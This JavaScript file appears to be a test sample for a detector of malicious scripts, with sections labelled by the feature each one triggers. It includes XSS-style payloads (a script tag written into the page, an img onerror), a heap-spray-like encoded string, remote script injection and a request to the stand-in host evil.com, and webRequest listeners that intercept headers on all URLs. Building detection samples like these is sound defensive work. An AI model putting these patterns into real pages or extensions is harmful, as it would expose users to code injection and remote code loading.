/* =========================
   Whitespace + long lines
========================= */

var a = 1;
var b = 2;
var c = 3;
var d = 4;
var e = 5;
var f = 6;
var g = 7;
var h = 8;
var i = 9;
var j = 10;

/* =========================
   Specific characters + encoding
========================= */

var encoded = "%u9090%u4141%u4242";
var hexPayload = "\x61\x6c\x65\x72\x74\x28\x31\x29";

/* =========================
   Word size (long identifiers)
========================= */

var thisIsAnExtremelyLongAndSuspiciousVariableNameUsedOnlyOnce = encoded;

/* =========================
   String entropy
========================= */

var highEntropy = "akd9823nAKSDJ9283nlasd*&^%$#@!";

/* =========================
   Dynamic code generation + eval
========================= */

eval("alert(1)");
setTimeout("console.log('timeout')", 1000);
setInterval("console.log('interval')", 2000);
new Function("console.log('new Function')")();

/* =========================
   DOM change methods
========================= */

document.write("<script>alert(1)</script>");
document.body.innerHTML = "<img src=x onerror=alert(1)>";
document.body.appendChild(document.createElement("script"));
document.body.insertAdjacentHTML("beforeend", "<div>Injected</div>");

/* =========================
   Event handlers
========================= */

window.addEventListener("message", function(e) {
    console.log(e.data);
});

window.attachEvent("onload", function() {});

/* =========================
   HTTP + HTTPS scripts
========================= */

var s = document.createElement("script");
s.src = "http://evil.com/a.js";
document.body.appendChild(s);

var s2 = document.createElement("script");
s2.src = "https://cdn.example.com/b.js";
document.body.appendChild(s2);

/* =========================
   XMLHttpRequest
========================= */

var xhr = new XMLHttpRequest();
xhr.open("GET", "https://evil.com/data");
xhr.send();

/* =========================
   HTTP header modification callbacks
========================= */

chrome.webRequest.onBeforeSendHeaders.addListener(
    function(details) {
        return {
            requestHeaders: details.requestHeaders
        };
    }, {
        urls: ["<all_urls>"]
    },
    ["blocking", "requestHeaders"]
);

chrome.webRequest.onHeadersReceived.addListener(
    function(details) {
        return {
            responseHeaders: details.responseHeaders
        };
    }, {
        urls: ["<all_urls>"]
    },
    ["blocking", "responseHeaders"]
);

/* =========================
   Keyword density
========================= */

if (true) {
    for (var k = 0; k < 10; k++) {
        function test(x) {
            return x + 1;
        }
    }
}